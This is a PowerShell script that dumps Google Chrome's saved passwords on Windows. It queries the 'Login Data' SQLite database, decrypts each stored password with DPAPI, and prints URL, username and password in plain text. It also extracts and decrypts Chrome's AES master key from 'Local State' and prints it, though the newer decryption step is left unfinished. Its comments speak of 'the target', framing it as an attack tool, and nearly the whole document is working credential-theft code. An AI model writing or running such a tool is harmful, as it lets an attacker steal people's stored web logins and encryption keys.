# Assuming Win 10 with Chrome and PowerShell 5.1 installed, print out the
# saved passwords created before Chrome v80 was installed.
#
# Launch recommendation:
#
#   pwsh .\chrome-decrypt.ps1
# 
$dataPath="$($env:LOCALAPPDATA)\\Google\\Chrome\\User Data\\Default\\Login Data"
$query = "SELECT origin_url, username_value, password_value FROM logins"

Add-Type -AssemblyName System.Security
Add-Type @"
    using System;
    using System.Runtime.InteropServices;

    public class WinSQLite3
    {
        const string dll = "winsqlite3";

        [DllImport(dll, EntryPoint="sqlite3_open")]
        public static extern IntPtr Open([MarshalAs(UnmanagedType.LPStr)] string filename, out IntPtr db);

        [DllImport(dll, EntryPoint="sqlite3_prepare16_v2")]
        public static extern IntPtr Prepare2(IntPtr db, [MarshalAs(UnmanagedType.LPWStr)] string sql, int numBytes, out IntPtr stmt, IntPtr pzTail);

        [DllImport(dll, EntryPoint="sqlite3_step")]
        public static extern IntPtr Step(IntPtr stmt);

        [DllImport(dll, EntryPoint="sqlite3_column_text16")]
        static extern IntPtr ColumnText16(IntPtr stmt, int index);

        [DllImport(dll, EntryPoint="sqlite3_column_bytes")]
        static extern int ColumnBytes(IntPtr stmt, int index);

        [DllImport(dll, EntryPoint="sqlite3_column_blob")]
        static extern IntPtr ColumnBlob(IntPtr stmt, int index);

        public static string ColumnString(IntPtr stmt, int index)
        { 
            return Marshal.PtrToStringUni(WinSQLite3.ColumnText16(stmt, index));
        }

        public static byte[] ColumnByteArray(IntPtr stmt, int index)
        {
            int length = ColumnBytes(stmt, index);
            byte[] result = new byte[length];
            if (length > 0)
                Marshal.Copy(ColumnBlob(stmt, index), result, 0, length);
            return result;
        }

        [DllImport(dll, EntryPoint="sqlite3_errmsg16")]
        public static extern IntPtr Errmsg(IntPtr db);

        public static string GetErrmsg(IntPtr db)
        {
            return Marshal.PtrToStringUni(Errmsg(db));
        }
    }
"@

$dbH = 0
if([WinSQLite3]::Open($dataPath, [ref] $dbH) -ne 0) {
    Write-Host "Failed to open!"
    [WinSQLite3]::GetErrmsg($dbh)
    exit
}

$stmt = 0
if ([WinSQLite3]::Prepare2($dbH, $query, -1, [ref] $stmt, [System.IntPtr]0) -ne 0) {
    Write-Host "Failed to prepare!"
    [WinSQLite3]::GetErrmsg($dbh)
    exit
}

while([WinSQLite3]::Step($stmt) -eq 100) {

    $url = [WinSQLite3]::ColumnString($stmt, 0)
    $u = [WinSQLite3]::ColumnString($stmt, 1)
    $p = $null

    try {

        $p = [System.Text.Encoding]::ASCII.GetString(
            [System.Security.Cryptography.ProtectedData]::Unprotect(
                [WinSQLite3]::ColumnByteArray($stmt, 2),
                $null,
                [Security.Cryptography.DataProtectionScope]::CurrentUser
            )
        )

    } catch [System.Security.Cryptography.CryptographicException] {
        # Strange no-consequence exception bubbled up and we can safely ignore
        # it.
    }

    Write-Host "$url,$u,$p"
}

# If the target has PowerShell 7.x installed, passwords created in Chrome
# after v80 was installed can also be decoded.
$localStatePath="$($env:LOCALAPPDATA)\\Google\\Chrome\\User Data\\Local State"
$localStateData = Get-Content -Raw $localStatePath

# This is insane, but ConvertFrom-Json doesn't work with this file in PS 5.1.
$keyBase64 = (($localStateData -Split 'encrypted_key":"')[1] -split '"')[0]
$keyBytes = [System.Convert]::FromBase64String($keyBase64)
$keyBytes = $keyBytes[5..($keyBytes.length-1)]  # Remove 'DPAPI' from start
$keyDecoded = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $keyBytes,
    $null,
    [Security.Cryptography.DataProtectionScope]::CurrentUser
)

Write-Host $keyDecoded

$decoder = [Security.Cryptography.AesGcm]::new($keyDecoded)


exit